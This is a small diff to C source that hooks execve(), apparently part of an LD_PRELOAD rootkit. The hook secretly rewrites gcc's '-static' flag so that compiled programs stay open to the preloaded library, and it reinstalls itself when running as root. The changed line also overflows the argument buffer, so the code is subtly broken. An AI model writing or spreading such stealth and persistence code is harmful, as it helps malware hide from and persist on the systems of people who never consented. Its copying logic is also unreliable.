@@ -240,7 +240,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         CLEAN(lib_name);
     }
 
-    if(argv[0] != NULL && strstr(argv[0], "gcc")) for(i=0; argv[i] != NULL;i++) if(!strcmp(argv[i], "-static")) strncpy(argv[i], "-Wvarargs", strlen("-Wvarargs"));
+    if(argv[0] != NULL && strstr(argv[0], "gcc")) for(i=0; argv[i] != NULL;i++) if(!strcmp(argv[i], "-static")) strcpy(argv[i], "-Wvarargs");
 
     if(geteuid() == 0) reinstall();
 
